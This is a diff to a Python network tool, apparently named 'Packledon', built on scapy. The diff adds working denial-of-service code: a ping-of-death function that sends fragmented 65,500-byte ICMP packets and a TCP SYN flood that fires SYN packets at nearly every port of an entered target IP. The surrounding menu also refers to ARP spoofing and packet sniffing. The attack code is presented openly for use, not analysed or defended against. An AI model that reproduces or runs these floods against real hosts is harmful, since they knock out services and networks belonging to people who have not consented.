@@ -1,10 +1,10 @@
+#imports
 from itertools import count
 from pyfiglet import Figlet
 import scapy.all as scapy #need scapy for network control/access 
+from scapy.all import *
 import sys
 import ipaddress
-import time
-
 #create banner
 f = Figlet(font='slant')
 print(f.renderText('Packledon'))
@@ -119,10 +119,33 @@ def arp_spoofing_attack():
 
 
 
+def ping_of_death(target_ip):
+    print(f"[+] Starting Ping of Death attack on {target_ip}...")
+    send( fragment(IP(dst=target_ip)/ICMP()/("X"*65500)), verbose=False)
+
+
+def tcp_syn_flood(target_ip):
+    print(f"[+] Starting TCP SYN Flood attack on {target_ip}...")
+    for port in range(1, 65535):
+        packet = IP(dst=target_ip)/TCP(dport=port, flags="S")
+        send(packet, verbose=False)
+
 
 def dos_attack():
     target_ip = input("Please enter the target IP address for the ping of death attack: ")    
-    send( fragment(IP(dst=target_ip)/ICMP()/("X"*60000)) )
+    try:
+        ping_of_death(target_ip)
+        print(f"[+] Ping of Death attack on {target_ip} initiated.")
+
+    except Exception as e:
+        print(f"Ping of Death Failed: {e}")
+
+    try:
+        tcp_syn_flood(target_ip)
+        print(f"[+] TCP SYN Flood attack on {target_ip} initiated.")
+
+    except Exception as e:
+        print(f"TCP SYN Flood Failed: {e}")
 
 
 
@@ -145,7 +168,7 @@ if user_determination == "1":
     arp_and_ping_scanning()
 
 elif user_determination == "2":
-    sniff(prn=packet_handler, count=100)
+    sniff(prn=packet_handler, count=700)
 
 elif user_determination == "3":
     enter_and_read_pcap()
@@ -197,5 +220,5 @@ else:
 
 
 
-if __name__ == "__main__":
-  enter_and_read_pcap()
+#if __name__ == "__main__":
+ #   main()
